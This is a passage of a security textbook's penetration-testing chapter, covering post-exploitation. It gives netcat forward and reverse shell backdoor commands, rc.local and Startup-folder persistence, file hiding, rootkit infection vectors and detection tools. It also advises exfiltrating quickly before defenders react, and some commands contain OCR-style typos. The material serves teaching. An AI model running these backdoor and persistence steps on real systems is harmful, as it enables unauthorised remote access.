- pgno: 208
  md: '# Chapter 8 ■ Penetration Testing 183


    # # Final Malicious Phases


    This chapter has shown you how to penetrate systems, pivot through the network,
    list user accounts, discover passwords, escalate privileges, and gain administrative
    access to multiple systems. At this point in the attack, you have full capability
    to take malicious actions, damage systems/data integrity, permanently entrench
    your presence, and exploit information over the long term.


    As a tester, you have no such malicious intent; however, you should gather enough
    evidence to prove to your test clients that you have achieved these accesses and
    have acquired these capabilities. For example, you could acquire a sample credit
    record, encrypt it, and attach a redacted version to your Security Assessment
    Report.


    Other useful information that gathers includes password hashes, encryption keys/seeds,
    service passwords, password lists, network directories, service files, and installed
    package listings. All this information is potentially useful for pen testers.
    Gathering information beyond this threshold would constitute malicious activity.
    The following discussion is strictly for edification, to help make you more aware
    of potential malicious techniques.


    Exporting information from systems is called data exfiltration. Patterns of exfiltration
    by an Advanced Persistent Threat (APT) include collocation of a designated server,
    compression of data into archive formats, and massive data transfers via a single
    nightly session. When collecting enormous amounts of information, such as the
    terbytes filtered from government and corporate servers by an APT, it is difficult
    to evade detection; therefore, anticipate discovery by network administrators
    and complete the transfer before defenses can react.


    # # Backdoors


    Backdoors are hidden ways to gain system access. You can set up backdoors using
    netcat like:


    ```

    Linux Backdoor (.10)

    On Attacker System

    # nc -l -p 80 -e /bin/bash

    # nc 10.10.100.10 80

    ```


    ```

    Reverse Linux Backdoor

    On Attacker System (.20)

    # nc 192.168.10.20 -e /bin/bash

    # nc -1 -p 80

    ```


    ```

    Windows Backdoor (.30)

    On Attacker System

    C:\> nc -L -p 80 -e cmd.exe

    # nc 10.10.100.30 80

    ```


    ```

    Reverse Windows Backdoor

    On Attacker System (.40)

    C:\> nc 192.168.10.40 -e cmd.exe

    # nc -1 -p 80

    ```


    Forward backdoors set up port 80 listeners running a command shell on the target
    machine. The attacker system sets up a remote complementary connection.'
  merge: -1
  img_proc: true
- pgno: 209
  md: '# 184 Part II Cyber Network Security Hands-On


    The reverse listeners connect from the target machine to a remote attacker, who
    runs a listener on port 80. In general, port 80 traffic originating from inside
    the target network is less likely to raise suspicions than reverse backdoors.


    On Windows, the -l option (capital L) allows a backdoor to connect and reconnect
    many times. Other backdoors will be disabled after the first attacker disconnection.
    All backdoors will disappear upon reboot.


    # Entrenchment


    To entrench a backdoor on the system to survive reboots, add the Backdoor command
    line (or the equivalent in a batch file), which spawns the backdoor as a process
    after every reboot.


    For example, on Linux, add the command line to /etc/rc.local or /etc/rc.local
    and add an ampersand (&) to spawn the process, enabling rc.local to terminate
    normally.


    On Windows, add a shortcut to the batch file in the Startup folder. Open the Startup
    folder from Start ✜ All Programs ✜ Startup (right-click) ✜ Open.


    # Hidden Files


    Renaming your files on Linux with a dot (.) or dot dot (..) hides them, making
    them harder to detect. On Windows, click the Hidden checkbox on the file properties
    dialog box. After you''ve done that, only dir /a or an equivalent command can
    detect the files.


    # Rootkits


    Rootkits are the ultimate form of malicious enchantment. A rootkit is a program
    that permanently captures system control and rigorously conceals itself from detection.
    A rootkit can infect a system in many ways, for example attack vectors include


    +   Phishing and Spear Phishing Email: The rootkit installer runs when an e-mail
    attachment is opened. Spear phishing is a social engineering attack directed at
    one individual, usually a Very Important Person (VIP). Phishing attacks are directed
    at groups of users. These attacks are highly effective in practice. See the antipattern
    Can''t Patch Dump in Chapter 2.

    - Drive-by malware: A website with malicious content can run scripts that install
    malware and rootkits when a user visits. These may be legitimate websites that
    have been hacked. Alternatively, drive-by malware can be delivered through advertisements
    on legitimate websites because the content of the ads are supplied by third parties
    (which can be malicious). Drive-by malware can affect any Internet-based application,
    for example smartphones and e-mail viewers that preview HTML content.'
  merge: -1
  img_proc: true
- pgno: 210
  md: '# Chapter 8 ■ Penetration Testing 185


    AutoPlay malware: This malware is resident on an AutoPlay device, such as a USB
    thumb drive, that automatically installs when the device is inserted.


    Rootkits are commonly at the user and kernel level, but can be at any level of
    the system stack: microcode, firmware, kernel, user, and application. User-level
    rootkits can infect the system with ordinary user privileges, and alter that user’s
    account to run malware processes and substitute system calls. Kernel-level rootkits
    modify the operating system and system calls, providing themselves with rigorous
    concealment. For example, rootkit files, processes, and network services can be
    made invisible to any program depending upon local Linux or Windows system calls
    to detect their presence.


    # Rootkit Removal


    The Malicious Software Removal Tool is Microsoft’s widely adopted Patch response
    to rootkit detection and removal. Other rootkit detection tools popular with security
    professionals include


    +   - Rootkit Hunter, which you can find at http://www.rootkit.nl/projects/rootkit_hunter.html

    - Rootkit Revealer from Microsoft

    - Blacklight from F-Secure

    - Helix from e-fence


    You can find a large array of other rootkit removal packages, rootkit descriptions,
    and other resources on www.antirootkit.com and PTF.


    # SEED LABS


    The SEED lab for this section is SYN-Cookie Lab under the Exploration Labs category.
    This lab contains descriptions of denial of service attacks, a malicious attack
    commonly occurring on the Internet. You can access the SEED labs at www.cis.syr.edu/~wedu/seed/all_labs.html.


